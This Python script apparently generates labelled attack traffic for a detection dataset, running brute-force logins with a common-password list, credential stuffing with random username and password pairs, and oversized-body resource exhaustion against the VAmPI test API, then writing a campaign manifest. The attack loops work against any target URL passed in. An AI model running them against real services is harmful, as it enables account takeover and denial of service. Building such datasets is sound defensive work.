"""Generates the behavioral attack families: brute force, credential stuffing and resource
exhaustion. These are visible over time windows rather than in single requests, so what
matters is the number of distinct session and window pairs, not the row count. Each
invocation runs from one attacker source IP and paces itself so the session spans several
windows; the orchestrator runs it from many IPs to reach the target window count per family.

- brute_force: many login attempts, one target username, a password dictionary.
- cred_stuffing: many distinct username and password pairs, as in a leaked-credential list.
- resource_exhaustion: high request rate plus oversized bodies.

The family comes from the campaign manifest. Nothing here matches request content.
"""

import argparse
import os
import random
import string
import sys
import time

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.manifest import now_iso, write_manifest  # noqa: E402
from common.uas import REALISTIC_UAS  # noqa: E402

COMMON_PW = ["123456", "password", "admin", "root", "qwerty", "letmein", "welcome",
             "monkey", "dragon", "111111", "abc123", "iloveyou", "admin123", "pass123",
             "changeme", "test", "guest", "master", "hello", "login"]
NAMES = ["admin", "root", "user", "test", "guest", "info", "support", "sales",
         "webmaster", "administrator", "operator", "manager", "dev", "staff"]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--family", required=True,
                    choices=["brute_force", "cred_stuffing", "resource_exhaustion"])
    ap.add_argument("--tool", default="custom")
    ap.add_argument("--manifest-dir", required=True)
    ap.add_argument("--campaign-id", required=True)
    ap.add_argument("--src-ip", required=True)
    ap.add_argument("--duration", type=float, default=55.0, help="seconds to span (multiple windows)")
    ap.add_argument("--rate", type=float, default=6.0, help="requests per second")
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    rng = random.Random(args.seed + hash(args.src_ip) % 10000)
    base = args.target.rstrip("/")
    sess = requests.Session()
    start = time.time()
    start_ts = now_iso()
    sent = 0
    interval = 1.0 / max(0.5, args.rate)

    def hdr():
        return {"User-Agent": rng.choice(REALISTIC_UAS)}

    while time.time() - start < args.duration:
        try:
            if args.family == "brute_force":
                sess.post(base + "/users/v1/login",
                          json={"username": "admin", "password": rng.choice(COMMON_PW)},
                          headers=hdr(), timeout=8)
            elif args.family == "cred_stuffing":
                u = rng.choice(NAMES) + str(rng.randint(1, 9999))
                p = "".join(rng.choices(string.ascii_letters + string.digits, k=rng.randint(6, 12)))
                sess.post(base + "/users/v1/login", json={"username": u, "password": p},
                          headers=hdr(), timeout=8)
            else:  # resource_exhaustion
                if sent % 5 == 0:
                    big = "A" * rng.randint(50_000, 200_000)
                    sess.post(base + "/users/v1/register",
                              json={"username": big[:100], "password": big, "email": "x@x.com"},
                              headers=hdr(), timeout=15)
                else:
                    sess.get(base + "/users/v1", headers=hdr(), timeout=8)
            sent += 1
        except requests.RequestException:
            pass
        time.sleep(interval)

    end_ts = now_iso()
    write_manifest(
        out_dir=args.manifest_dir, campaign_id=args.campaign_id, app="vampi",
        label="attack", attack_family=args.family, attack_tool=args.tool,
        src_ip=args.src_ip, start_ts=start_ts, end_ts=end_ts,
        extra={"seed": args.seed, "rows_sent": sent, "duration": args.duration, "rate": args.rate},
    )
    print(f"[behav:{args.family}] src={args.src_ip} sent {sent} over {args.duration}s "
          f"window [{start_ts},{end_ts}]", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
